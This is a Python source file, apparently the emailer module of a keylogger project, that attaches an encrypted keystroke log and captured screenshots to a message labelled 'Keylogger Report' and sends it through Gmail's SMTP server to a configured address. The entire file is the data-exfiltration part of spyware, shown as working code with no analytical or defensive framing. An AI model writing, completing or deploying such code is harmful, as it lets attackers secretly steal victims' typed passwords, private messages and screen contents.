# emailer.py
import smtplib, ssl
from email.message import EmailMessage
from glob import glob
from config import EMAIL, APP_PASSWORD, TO_EMAIL, LOG_FOLDER  # Import email settings from config.py

def send_email():
    msg = EmailMessage()
    msg["Subject"] = "Keylogger Report"
    msg["From"] = EMAIL  # From email address
    msg["To"] = TO_EMAIL  # To email address
    msg.set_content("Log and screenshots attached.")
    
    with open("logs/keylog_encrypted.txt", "rb") as f:
        msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename="keylog_encrypted.txt")

    for path in glob("logs/screenshot_*.png"):
        with open(path, "rb") as f:
            msg.add_attachment(f.read(), maintype="image", subtype="png", filename=path.split("/")[-1])

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(EMAIL, APP_PASSWORD)  # Login with the email and app password
        server.send_message(msg)
    print("[📨] Email sent!")
